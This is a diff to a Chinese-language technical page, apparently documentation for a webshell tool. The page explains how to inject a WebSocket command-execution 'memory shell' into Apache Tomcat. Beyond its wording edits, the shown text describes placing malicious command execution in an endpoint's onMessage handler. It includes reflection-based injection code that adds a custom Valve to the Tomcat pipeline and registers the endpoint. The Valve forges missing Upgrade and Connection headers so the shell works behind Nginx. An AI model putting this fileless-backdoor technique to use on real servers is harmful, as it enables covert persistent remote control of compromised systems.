@@ -50,7 +50,7 @@ public class ExampleEndpoint extends Endpoint {
 }
 ```
 
-接口继承 javax.websocket.Endpoint，在 onOpen 的时候注册消息处理器。
+通过继承 `javax.websocket.Endpoint` 类，在 `onOpen` 方法中注册消息处理器。
 
 在内存马场景下，可以在 onMessage 方法中添加恶意逻辑，例如执行系统命令或加载其他恶意代码，以下是命令回显 WebSocket Endpoint 示例：
 
@@ -129,7 +129,7 @@ public class WsSci implements ServletContainerInitializer {
         Set<ServerEndpointConfig> filteredEndpointConfigs = ...;
         try {
             for (ServerEndpointConfig config : filteredEndpointConfigs) {
-                sc.addEndpoint(config);
+                sc.addEndpoint(config); // [!code highlight]
             }
             // ...
         } catch (DeploymentException e) {
@@ -139,7 +139,7 @@ public class WsSci implements ServletContainerInitializer {
 
     static WsServerContainer init(ServletContext servletContext, boolean initBySciMechanism) {
         WsServerContainer sc = new WsServerContainer(servletContext);
-        servletContext.setAttribute("javax.websocket.server.ServerContainer", sc);
+        servletContext.setAttribute("javax.websocket.server.ServerContainer", sc); // [!code highlight]
         // ...
         return sc;
     }
@@ -204,7 +204,7 @@ sec-websocket-key = 4yY8pZQPUv6RlRoPgh7SaA==
 sec-websocket-extensions = permessage-deflate; client_max_window_bits
 ```
 
-实现细节的话，不知道大家有没有注意到 Tomcat 中总是默认注册个 Filter 叫作 `org.apache.tomcat.websocket.server.WsFilter`，其实这个就是用于将 HTTP 请求升级为 WebSocket 协议的 Filter。
+在实现细节上，Tomcat 默认会注册一个名为 `org.apache.tomcat.websocket.server.WsFilter` 的 Filter，用于将 HTTP 请求升级为 WebSocket 协议。
 
 首先会在 `UpgradeUtil.isWebSocketUpgradeRequest` 判断请求头里面有没有 `Upgrade: websocket` 以及是不是 GET 请求。
 其次在 `UpgradeUtil.doUpgrade` 方法中会检查 `Connection: upgrade` 以及 `Sec-WebSocket-Version: 13`，如果没有这些头部就会直接返回 400 或 426 错误码。
@@ -239,15 +239,15 @@ public class UpgradeUtil {
     public static boolean isWebSocketUpgradeRequest(ServletRequest request, ServletResponse response) {
         return request instanceof HttpServletRequest 
                 && response instanceof HttpServletResponse 
-                && headerContainsToken((HttpServletRequest)request, "Upgrade", "websocket") 
+                && headerContainsToken((HttpServletRequest)request, "Upgrade", "websocket")  // [!code highlight]
                 && "GET".equals(((HttpServletRequest)request).getMethod());
     }
 
     public static void doUpgrade(WsServerContainer sc, HttpServletRequest req, HttpServletResponse resp, ServerEndpointConfig sec, Map<String, String> pathParams) throws ServletException, IOException {
         String subProtocol = null;
-        if (!headerContainsToken(req, "Connection", "upgrade")) {
+        if (!headerContainsToken(req, "Connection", "upgrade")) { // [!code highlight]
             resp.sendError(400);
-        } else if (!headerContainsToken(req, "Sec-WebSocket-Version", "13")) {
+        } else if (!headerContainsToken(req, "Sec-WebSocket-Version", "13")) { // [!code highlight]
             resp.setStatus(426);
             resp.setHeader("Sec-WebSocket-Version", "13");
         }
@@ -256,7 +256,7 @@ public class UpgradeUtil {
 }
 ```
 
-结合上面透过 Nginx Tomcat 拿到的请求头，我们缺失的就是 `Upgrade: websocket` 和 `Connection: upgrade` 这两个请求头，使得请求根本没进入 WsFilter 的逻辑导致连接失败。所以我们需要伪造一个类似 WsFilter 的组件并且处理缺失的请求头，我根据 Filter 和 Valve 的注入的代码量，选择了更轻量化的 Valve 组件：
+结合上面通过 Nginx 转发到 Tomcat 的请求头，可以看到缺失的就是 `Upgrade: websocket` 和 `Connection: upgrade` 这两个请求头，导致请求无法进入 WsFilter 的逻辑从而连接失败。因此我们需要创建一个类似 WsFilter 的组件来补充缺失的请求头。考虑到 Filter 和 Valve 的注入代码量，这里选择了更轻量化的 Valve 组件：
 
 ```java
 public class TomcatWsBypassValve implements Valve {
@@ -348,7 +348,7 @@ private void inject(Object context, Object obj) throws Exception {
     Object pipeline = invokeMethod(context, "getPipeline", null, null); // [!code ++]
     Class valveClass = context.getClass().getClassLoader().loadClass("org.apache.catalina.Valve"); // [!code ++]
     invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{valve}); // [!code ++]
-    
+
     ClassLoader contextClassLoader = context.getClass().getClassLoader();
     Class<?> serverEndpointConfigClass;
     Class<?> builderClass;
@@ -369,3 +369,7 @@ private void inject(Object context, Object obj) throws Exception {
     invokeMethod(container, "addEndpoint", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
 }
 ```
+
+## 相关文档
+
+- [Command 内存马使用教程](/docs/shelltool/command) - 了解如何生成和使用 WebSocket 命令执行内存马
